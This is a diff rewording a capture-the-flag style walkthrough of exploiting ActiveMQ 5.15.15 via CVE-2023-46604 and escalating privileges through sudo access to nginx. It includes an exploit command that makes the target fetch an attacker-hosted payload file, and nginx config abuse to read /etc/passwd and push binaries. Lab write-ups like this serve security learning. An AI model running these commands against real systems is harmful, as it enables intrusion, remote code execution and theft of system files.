@@ -131,13 +131,11 @@ OS and Service detection performed. Please report any incorrect results at https
 
 # User
 
-Port **61616** -> `ActiveMQ v5.15.15`
+Port **61616** runs `ActiveMQ v5.15.15`.
 
 > CVE : https://github.com/evkl1d/CVE-2023-46604
 
-- Set up a python server with the edited **poc.xml** script
-- Set up a listener
-- Execute the exploit
+Set up a python server hosting the edited **poc.xml**, start a listener, then run the exploit:
 
 ```sh
 python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.16.82/poc.xml
@@ -155,16 +153,13 @@ sudo -l
 
 > https://gtfobins.org/gtfobins/nginx/
 
-There are three methods:
-- upload
-- download
-- library load
+There are three ways to abuse it: read files off the system, push a payload onto it, or load a malicious library.
 
 ---
 ### Upload
 
 #### Target
-Create a config file and start the nginx server with that config — we can then access files from the system using curl or from the url:
+Create a config file and start the nginx server with that config — we can then pull files from the system over HTTP with curl:
 
 ```sh
 cat >/tmp/nginx.conf <<'EOF'
@@ -194,7 +189,7 @@ curl http://target:8080/etc/passwd -o passwd.txt
 ### Download
 
 #### Target
-Create a config file and start the server with that config and use the **PUT** method so the binary will be downloaded and executed:
+Create a config file, start the server with it, and use the **PUT** method to push a binary onto the box for execution:
 
 ```sh
 cat >/tmp/nginx.conf <<'EOF'
@@ -246,7 +241,7 @@ Execute nginx with that conf:
 sudo nginx -t -c /tmp/nginx.conf
 ```
 
-`-t` -> test syntax error before deploying 
+`-t` tests the config for syntax errors before deploying it
 
 ---
 
